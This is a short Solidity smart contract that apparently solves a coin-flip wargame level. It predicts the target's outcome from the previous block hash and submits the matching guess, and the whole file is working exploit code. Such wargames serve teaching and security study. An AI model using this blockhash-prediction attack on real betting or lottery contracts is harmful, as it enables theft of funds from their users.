pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract coinFlipAttacker {
    
    CoinFlip public CoinFlip1;

    using SafeMath for uint256;
    using SafeMath for bool;
    // address owner;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(CoinFlip _CoinFlip) public {
        // owner = msg.sender;
        CoinFlip1 = _CoinFlip;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        CoinFlip1.flip(side);
    }
}
